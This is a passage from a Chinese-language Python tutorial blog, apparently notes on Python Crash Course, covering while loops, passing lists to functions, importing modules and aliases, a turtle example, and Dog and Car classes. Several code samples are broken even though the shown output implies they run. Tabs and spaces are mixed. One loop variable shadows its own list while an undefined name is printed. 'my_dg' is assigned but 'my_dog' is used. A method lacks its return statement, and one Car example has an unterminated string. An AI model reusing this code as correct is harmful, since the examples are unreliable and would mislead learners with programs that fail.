<h4 id="返回值搭配while循环"><a href="#返回值搭配while循环" class="headerlink" title="返回值搭配while循环"></a>返回值搭配while循环</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#greet.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_formatted_name</span>(<span class="params">first_name, last_name</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;返回整洁的姓名&quot;&quot;&quot;</span></span><br><span class="line">	full_name = first_name + <span class="string">&#x27; &#x27;</span> + last_name</span><br><span class="line">    <span class="keyword">return</span> full_name.title()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nPlease tell me your name:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(enter &#x27;q&#x27; to any time to quit)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    f_name=<span class="built_in">input</span>(<span class="string">&quot;First name:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> f_name == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    l_name=<span class="built_in">input</span>(<span class="string">&quot;Last name:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> l_name == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    formatted_name = get_formatted_name(f_name,l_name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nHello,&quot;</span>+formatted_name + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Please tell me your name:</span><br><span class="line">(enter <span class="string">&#x27;q&#x27;</span> at any time to quit)</span><br><span class="line">First name: eric</span><br><span class="line">Last name: matthes</span><br><span class="line">Hello, Eric Matthes!</span><br><span class="line">Please tell me your name:</span><br><span class="line">(enter <span class="string">&#x27;q&#x27;</span> at any time to quit)</span><br><span class="line">First name: q</span><br></pre></td></tr></table></figure></div>

<h3 id="传递列表"><a href="#传递列表" class="headerlink" title="传递列表"></a>传递列表</h3><h4 id="向函数中传递列表"><a href="#向函数中传递列表" class="headerlink" title="向函数中传递列表"></a>向函数中传递列表</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#greet_users.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet_users</span>(<span class="params">names</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;向列表中的每一位用户发出简单的问候&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        msg = <span class="string">&quot;Hello,&quot;</span> + name.title() + <span class="string">&quot;!&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line">usernames = [<span class="string">&#x27;hannah&#x27;</span>,<span class="string">&#x27;ty&#x27;</span>,<span class="string">&#x27;margot&#x27;</span>,<span class="string">&#x27;敬请T期待&#x27;</span>]</span><br><span class="line">greet_users(usernames)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Hello, Hannah!</span><br><span class="line">Hello, Ty!</span><br><span class="line">Hello, Margot!</span><br><span class="line">Hello, 敬请T期待!</span><br></pre></td></tr></table></figure></div>

<h3 id="在函数中修改列表"><a href="#在函数中修改列表" class="headerlink" title="在函数中修改列表"></a>在函数中修改列表</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#print_models.py</span></span><br><span class="line"><span class="comment">#首先创建一个列表，其中包含一些要打印的设计</span></span><br><span class="line">unprinted_designs = [<span class="string">&#x27;iphone case&#x27;</span>, <span class="string">&#x27;robot pendant&#x27;</span>, <span class="string">&#x27;dodecahedron&#x27;</span>]</span><br><span class="line">completed_models = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#模拟打印每一个设计，直到没有未打印的设计为止</span></span><br><span class="line"><span class="comment">#打印每一个设计后，都将其移到列表completed_models中</span></span><br><span class="line"><span class="keyword">while</span> unprinted_designs:</span><br><span class="line">    current_design = unprinted_designs.pop()</span><br><span class="line">    <span class="comment">#模拟根据设计制作3D打印模型的过程</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Printing model:&quot;</span> + current_design)</span><br><span class="line">    completed_models.append(current_design)</span><br><span class="line"><span class="comment">#显示打印好的所有模型</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nThe following models have been printed:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> completed_models <span class="keyword">in</span> completed_models:</span><br><span class="line">    <span class="built_in">print</span>(completed_model)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Printing model: dodecahedron</span><br><span class="line">Printing model: robot pendant</span><br><span class="line">Printing model: iphone case</span><br><span class="line"></span><br><span class="line">The following models have been printed:</span><br><span class="line">dodecahedron</span><br><span class="line">robot pendant</span><br><span class="line">iphone case</span><br></pre></td></tr></table></figure></div>

<p>提高效率版</p>
<blockquote>
<p>每个函数都应只负责一项具体的工作。第一个函数打印每个设计，而第二个显示打印好的模型；这优于使用一个函数来完成两项工作。编写函数时，如果你发现它执行的任务太多，请尝试将这些代码划分到两个函数中。别忘了，总是可以在一个函数中调用另一个函数，这有助于将复杂的任务划分成一系列的步骤。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#print_models()</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_models</span>(<span class="params">unprinted_designs, completed_models</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    模拟打印每个设计，直到没有未打印的设计为止</span></span><br><span class="line"><span class="string">    打印每个设计后，都将其移到列表completed_models中</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> unprinted_designs:</span><br><span class="line">        current_design = unprinted_designs.pop()</span><br><span class="line">        <span class="comment"># 模拟根据设计制作3D打印模型的过程</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Printing model: &quot;</span> + current_design)</span><br><span class="line">		completed_models.append(current_design)</span><br><span class="line"><span class="comment">#show_completed_models()    </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_completed_models</span>(<span class="params">completed_models</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;显示打印好的所有模型&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nThe following models have been printed:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> completed_model <span class="keyword">in</span> completed_models:</span><br><span class="line">        <span class="built_in">print</span>(completed_model)</span><br><span class="line"></span><br><span class="line">unprinted_designs = [<span class="string">&#x27;iphone case&#x27;</span>, <span class="string">&#x27;robot pendant&#x27;</span>, <span class="string">&#x27;dodecahedron&#x27;</span>]</span><br><span class="line">completed_models = []</span><br><span class="line">print_models(unprinted_designs, completed_models)</span><br><span class="line">show_completed_models(completed_models)</span><br></pre></td></tr></table></figure></div>

<h4 id="传递列表副本"><a href="#传递列表副本" class="headerlink" title="传递列表副本"></a>传递列表副本</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">function_name(list_name[:])</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>切片表示法[:]创建列表的副本。向函数传递列表的副本可保留原始列表的内容。</p>
<p>但除非有充分的理由需要传递副本，否则还是应该将原始列表传递给函数，因为让函数使用现成列表可避免花时间和内存创建副本，从而提高效率，在处理大型列表时尤其如此。</p>
</blockquote>
<h3 id="将函数存储在模块中"><a href="#将函数存储在模块中" class="headerlink" title="将函数存储在模块中"></a>将函数存储在模块中</h3><h4 id="import导入整个模块"><a href="#import导入整个模块" class="headerlink" title="import导入整个模块"></a>import导入整个模块</h4><blockquote>
<p>模块是扩展名为.py的文件，包含要导入到程序中的代码。</p>
</blockquote>
<blockquote>
<p>import 导入外部模块，但是需要用‘.语句’来调用函数</p>
<p><strong>module_name</strong>.**function_name()**调用模块内的函数；</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pizza.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pizza</span>(<span class="params">size, *toppings</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;概述要制作的比萨&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nMaking a &quot;</span> + <span class="built_in">str</span>(size) +<span class="string">&quot;-inch pizza with the following toppings:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> topping <span class="keyword">in</span> toppings:</span><br><span class="line">   		<span class="built_in">print</span>(<span class="string">&quot;- &quot;</span> + topping)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在pizza.py所在的目录中创建另一个名为making_pizzas.py的文件，这个文件导入刚创建的模块，再调用make_pizza()两次：</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#making_pizza.py</span></span><br><span class="line"><span class="keyword">import</span> pizza</span><br><span class="line"></span><br><span class="line">pizza.make_pizza(<span class="number">16</span>, <span class="string">&#x27;pepperoni&#x27;</span>)</span><br><span class="line">pizza.make_pizza(<span class="number">12</span>, <span class="string">&#x27;mushrooms&#x27;</span>, <span class="string">&#x27;green peppers&#x27;</span>, <span class="string">&#x27;extra cheese&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Making a 16-inch pizza with the following toppings:</span><br><span class="line">- pepperoni</span><br><span class="line"></span><br><span class="line">Making a 12-inch pizza with the following toppings:</span><br><span class="line">- mushrooms</span><br><span class="line">- green peppers</span><br><span class="line">- extra cheese</span><br></pre></td></tr></table></figure></div>

<h4 id="导入特定的函数"><a href="#导入特定的函数" class="headerlink" title="导入特定的函数"></a>导入特定的函数</h4><p>从模块中导入特定的一个函数</p>
<blockquote>
<p>利用 <strong>from</strong> <u>module_name</u> <strong>import</strong> <u>function_named</u></p>
</blockquote>
<p>通过用逗号分隔函数名，可根据需要从模块中导入任意数量的函数：</p>
<blockquote>
<p><strong>from</strong> <u>module_name</u> <strong>import</strong> <u>function_0</u>, <u>function_1</u>, <u>function_2</u></p>
</blockquote>
<h4 id="使用-as-给函数指定别名"><a href="#使用-as-给函数指定别名" class="headerlink" title="使用 as 给函数指定别名"></a>使用 as 给函数指定别名</h4><blockquote>
<p> 如果要导入的函数的名称可能与程序中现有的名称冲突，或者函数的名称太长，可指定简短而独一无二的别名——函数的另一个名称，类似于外号。要给函数指定这种特殊外号，需要在导入它时这样做。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#turtle.py</span></span><br><span class="line"><span class="comment">#导入turtle库画一个正方形</span></span><br><span class="line"><span class="keyword">import</span> turtle <span class="keyword">as</span> t</span><br><span class="line">color = [<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;purple&#x27;</span>,<span class="string">&#x27;#33cc8c&#x27;</span>]</span><br><span class="line">t.penup()</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.goto(-<span class="number">100</span>,-<span class="number">100</span>)</span><br><span class="line">t.pendown()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    t.pencolor(color[i])</span><br><span class="line">    t.forward(<span class="number">200</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">t.fillcolor(<span class="string">&#x27;pink&#x27;</span>)</span><br><span class="line">t.end_fill()</span><br><span class="line">t.down()</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/turtle%E7%A4%BA%E4%BE%8B.png" style="zoom: 67%;">)</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*— coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#making_pizza.py</span></span><br><span class="line"><span class="keyword">from</span> pizza <span class="keyword">import</span> make_pizza <span class="keyword">as</span> mp</span><br><span class="line">mp(<span class="number">16</span>, <span class="string">&#x27;pepperoni&#x27;</span>)</span><br><span class="line">mp(<span class="number">12</span>, <span class="string">&#x27;mushrooms&#x27;</span>, <span class="string">&#x27;green peppers&#x27;</span>, <span class="string">&#x27;extra cheese&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="导入模块中的所有函数"><a href="#导入模块中的所有函数" class="headerlink" title="导入模块中的所有函数"></a>导入模块中的所有函数</h4><blockquote>
<p><strong>from</strong> <u>module_name</u> <strong>import</strong> *</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pizza <span class="keyword">import</span> *</span><br><span class="line">make_pizza(<span class="number">16</span>, <span class="string">&#x27;pepperoni&#x27;</span>)</span><br><span class="line">make_pizza(<span class="number">12</span>, <span class="string">&#x27;mushrooms&#x27;</span>, <span class="string">&#x27;green peppers&#x27;</span>, <span class="string">&#x27;extra cheese&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h3 id="创建和使用类"><a href="#创建和使用类" class="headerlink" title="创建和使用类"></a>创建和使用类</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dog.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>():</span><br><span class="line">	<span class="string">&quot;&quot;&quot;一次模拟小狗的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">       <span class="comment">#注意:init左右两边各有2个”_&quot;是&quot;__&quot;不是&quot;_&quot;</span></span><br><span class="line">   	<span class="string">&quot;&quot;&quot;初始化属性name和age&quot;&quot;&quot;</span></span><br><span class="line">    	self.name = name</span><br><span class="line">   	self.age = age</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">   	<span class="string">&quot;&quot;&quot;模拟小狗被命令时蹲下&quot;&quot;&quot;</span></span><br><span class="line">   	<span class="built_in">print</span>(self.name.title() + <span class="string">&quot; is now sitting.&quot;</span>)</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">roll_over</span>(<span class="params">self</span>):</span><br><span class="line">  		<span class="string">&quot;&quot;&quot;模拟小狗被命令时打滚&quot;&quot;&quot;</span></span><br><span class="line">   	<span class="built_in">print</span>(self.name.title() + <span class="string">&quot; rolled over!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>__init__()是一个特殊的方法,对定义类的属性进行初始化，python自动调用，类似于C++的构造函数。</p>
<p>注意:init左右两边各有2个”__“是”__“(两个英文下划线)不是”_”</p>
<p>在这个方法的定义中，形参self必不可少，还必须位于其他形参的前面。</p>
<p>Python调用这个__init__()方法来创建类实例时，将自动传入实参self。每个与类相关联的方法调用都自动传递实参self，它是一个指向实例本身的引用，让实例能够访问类中的属性和方法。</p>
</blockquote>
<h4 id="创建类实例"><a href="#创建类实例" class="headerlink" title="创建类实例"></a>创建类实例</h4><p><strong>调用实例的属性</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dog.py</span></span><br><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;is now sitting.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">roll_over</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;rolled over!&quot;</span>)</span><br><span class="line">my_dog=Dog(<span class="string">&quot;willie&quot;</span>,<span class="number">6</span>)<span class="comment">#创建抽象类的实例化对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My dog&#x27;s name is &quot;</span>+ my_dog.name.title())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My dog is &quot;</span>+<span class="built_in">str</span>(my_dog.age)+<span class="string">&quot;years old.&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">My dog<span class="string">&#x27;s name is Willie.</span></span><br><span class="line"><span class="string">My dog is 6 years old.</span></span><br></pre></td></tr></table></figure></div>

<p><strong>调用实例的方法</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dog.py</span></span><br><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;is now sitting.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">roll_over</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;rolled over!&quot;</span>)</span><br><span class="line">my_dg=Dog(<span class="string">&#x27;willie&#x27;</span>,<span class="number">6</span>)<span class="comment">#创建抽象类的实例化对象</span></span><br><span class="line">my_dog.sit()<span class="comment">#利用对象调用其包含的方法</span></span><br><span class="line">my_dog.roll_over()<span class="comment">#利用对象调用其包含的方法</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Willie is now sitting.</span><br><span class="line">Willie rolled over!</span><br></pre></td></tr></table></figure></div>

<p><strong>创建多个实例</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dog.py</span></span><br><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;is now sitting.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">roll_over</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;rolled over!&quot;</span>)</span><br><span class="line"><span class="comment">#创建多个实例对象      </span></span><br><span class="line">my_dog = Dog(<span class="string">&#x27;willie&#x27;</span>, <span class="number">6</span>)</span><br><span class="line">your_dog = Dog(<span class="string">&#x27;lucy&#x27;</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">#对my_dog对象进行运用</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My dog&#x27;s name is &quot;</span> + my_dog.name.title() + <span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My dog is &quot;</span> + <span class="built_in">str</span>(my_dog.age) + <span class="string">&quot; years old.&quot;</span>)  </span><br><span class="line">my_dog.sit()</span><br><span class="line"><span class="comment">#对your_dog对象进行运用</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nYour dog&#x27;s name is &quot;</span> + your_dog.name.title() + <span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Your dog is &quot;</span> + <span class="built_in">str</span>(your_dog.age) + <span class="string">&quot; years old.&quot;</span>)</span><br><span class="line">your_dog.sit()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">My dog<span class="string">&#x27;s name is Willie.</span></span><br><span class="line"><span class="string">My dog is 6 years old.</span></span><br><span class="line"><span class="string">Willie is now sitting.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your dog&#x27;</span>s name is Lucy.</span><br><span class="line">Your dog is 3 years old.</span><br><span class="line">Lucy is now sitting.</span><br></pre></td></tr></table></figure></div>

<h4 id="给属性指定默认值"><a href="#给属性指定默认值" class="headerlink" title="给属性指定默认值"></a>给属性指定默认值</h4><blockquote>
<p>类中的每个属性都必须有初始值，哪怕这个值是0或空字符串。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;返回整洁的描述性信息&quot;&quot;&quot;</span></span><br><span class="line">		long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line"> 	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;打印一条指出汽车里程的消息&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">my_new_car = Car(<span class="string">&#x27;audi&#x27;</span>, <span class="string">&#x27;a4&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_new_car.get_descriptive_name())</span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Audi A4</span><br><span class="line">This car has 0 miles on it.</span><br></pre></td></tr></table></figure></div>

<h4 id="修改属性的值"><a href="#修改属性的值" class="headerlink" title="修改属性的值"></a>修改属性的值</h4><blockquote>
<p>三种不同的方式修改属性的值：</p>
<ul>
<li>直接通过实例进行修改；</li>
<li>通过方法进行设置；</li>
<li>通过方法进行递增（增加特定的值）。</li>
</ul>
</blockquote>
<p><strong>直接通过实例进行修改</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;返回整洁的描述性信息&quot;&quot;&quot;</span></span><br><span class="line">		long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line"> 	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;打印一条指出汽车里程的消息&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">my_new_car = Car(<span class="string">&#x27;audi&#x27;</span>, <span class="string">&#x27;a4&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_new_car.get_descriptive_name())	</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;修改属性值&#x27;&#x27;&#x27;</span></span><br><span class="line">my_new_car.odometer_reading = <span class="number">23</span></span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">2016</span> Audi A4</span><br><span class="line">This car has <span class="number">23</span> miles on it.</span><br></pre></td></tr></table></figure></div>

<p><strong>通过方法进行设置属性值</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;返回整洁的描述性信息&quot;&quot;&quot;</span></span><br><span class="line">		long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line"> 	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;打印一条指出汽车里程的消息&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it</span></span><br><span class="line"><span class="string">	def update_odometer(self, mileage):</span></span><br><span class="line"><span class="string">		&quot;</span><span class="string">&quot;&quot;</span>将里程表读数设置为指定的值<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		self.odometer_reading = mileage</span></span><br><span class="line"><span class="string">my_new_car = Car(&#x27;audi&#x27;, &#x27;a4&#x27;, 2016)</span></span><br><span class="line"><span class="string">print(my_new_car.get_descriptive_name())</span></span><br><span class="line"><span class="string">my_new_car.update_odometer(23)</span></span><br><span class="line"><span class="string">my_new_car.read_odometer()             </span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Audi A4</span><br><span class="line">This car has 23 miles on it.</span><br></pre></td></tr></table></figure></div>

<p><strong>通过方法对属性的值进行递增</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;返回整洁的描述性信息&quot;&quot;&quot;</span></span><br><span class="line">		long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line"> 	<span class="keyword">def</span> <span class="title 